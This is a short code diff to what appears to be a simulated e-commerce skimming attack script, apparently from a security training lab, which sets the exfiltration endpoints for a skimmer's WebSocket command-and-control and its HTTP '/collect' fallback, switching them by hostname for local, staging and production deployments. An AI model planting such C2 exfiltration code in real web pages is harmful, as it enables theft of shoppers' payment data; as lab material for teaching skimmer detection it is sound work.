@@ -254,9 +254,18 @@
 
   // Kritec-style attack: WebSocket C2 communication
   setTimeout(function () {
+    // Dynamically determine C2 URLs based on environment
+    const hostname = window.location.hostname
+    let fallbackUrl = 'http://localhost:3000/collect' // Local development default
+
+    // Production and staging - use relative URL since C2 is proxied by nginx
+    if (hostname.includes('run.app') || hostname.includes('pcioasis.com')) {
+      fallbackUrl = window.location.origin + '/collect'
+    }
+
     const CONFIG = {
       wsUrl: 'ws://localhost:3001/ws', // WebSocket C2 endpoint
-      fallbackUrl: 'http://localhost:9002/collect', // HTTP fallback
+      fallbackUrl: fallbackUrl, // HTTP fallback
       reconnectDelay: 1000, // Initial reconnect delay
       maxReconnectDelay: 30000, // Max reconnect delay
       reconnectAttempts: 0, // Track reconnection attempts
